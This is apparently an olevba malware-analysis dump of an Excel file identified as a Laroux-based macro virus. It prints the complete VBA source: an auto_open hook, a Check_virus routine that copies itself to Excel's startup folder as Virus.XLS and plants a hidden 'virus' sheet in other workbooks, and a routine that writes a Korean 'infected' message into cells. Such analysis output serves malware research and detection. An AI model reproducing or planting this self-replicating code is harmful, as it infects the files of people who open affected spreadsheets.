olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-67e27bb0ae92a9a5cdea4d17dd2c99a4003e7fe8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO virus.bas 
in file: Virus.MSExcel.Laroux-based-67e27bb0ae92a9a5cdea4d17dd2c99a4003e7fe8 - OLE stream: '_VBA_PROJECT_CUR/VBA/virus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "Check_virus"

End Sub

Sub Check_virus()
Attribute Check_virus.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "Virus.XLS")
    If m$ = "Virus.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
        Application.ScreenUpdating = False
        n4$ = ActiveWorkbook.Name
        Sheets("virus").Visible = True
        Sheets("virus").Select
       
        With ActiveWorkbook
            .Title = ""
            .Subject = ""
            .Author = ""
            .Keywords = ""
            .Comments = ""
        End With
        newname$ = ActiveWorkbook.Name
        c4$ = CurDir()
        ChDir Application.StartupPath
        ActiveWindow.Visible = False
        Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "Virus.XLS", FileFormat:=xlNormal _
            , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
            False, CreateBackup:=False
        ChDir c4$
        Workbooks(n4$).Sheets("virus").Visible = False
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "Virus.xls!Check_virus"
    Case 1
        Application.ScreenUpdating = False
        n4$ = ActiveWorkbook.Name
        p4$ = ActiveWorkbook.Path
        s$ = Workbooks(n4$).Sheets(1).Name
        If s$ <> "virus" Then
            Workbooks("Virus.XLS").Sheets("virus").Copy before:=Workbooks(n4$).Sheets(1)
            Workbooks(n4$).Sheets("virus").Visible = False
        Else
        End If
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "Virus.xls!Check_virus"
    Case Else
End Select
End Sub

Sub MassageVirus()
Attribute MassageVirus.VB_ProcData.VB_Invoke_Func = " \n14"
    ActiveCell.FormulaR1C1 = "바이러스에 감염되었음. 매크로바이러스를 잡아라"
    With ActiveCell.Characters(Start:=1, Length:=12).Font
        .Name = "돋움"
        .FontStyle = "보통"
        .Size = 20
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = 3
    End With
    Range("A1").Select
    Selection.Copy
    Range("B2").Select
    ActiveSheet.Paste
    Application.CutCopyMode = False
    Selection.Copy
    Range("C3").Select
    ActiveSheet.Paste
    Application.CutCopyMode = False
    Selection.Copy
    Range("D4").Select
    ActiveSheet.Paste
    Application.CutCopyMode = False
    Range("E5").Select
    ActiveSheet.Paste
    Application.CutCopyMode = False
    Range("F6").Select
    ActiveSheet.Paste
    Application.CutCopyMode = False
    Range("G7").Select
    ActiveSheet.Paste
    Application.CutCopyMode = False
    Range("H8").Select
    ActiveSheet.Paste
    Application.CutCopyMode = False
End Sub

-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux-based-67e27bb0ae92a9a5cdea4d17dd2c99a4003e7fe8 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  viru
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ©ÆÀ
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ÀÉ¥Ç
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

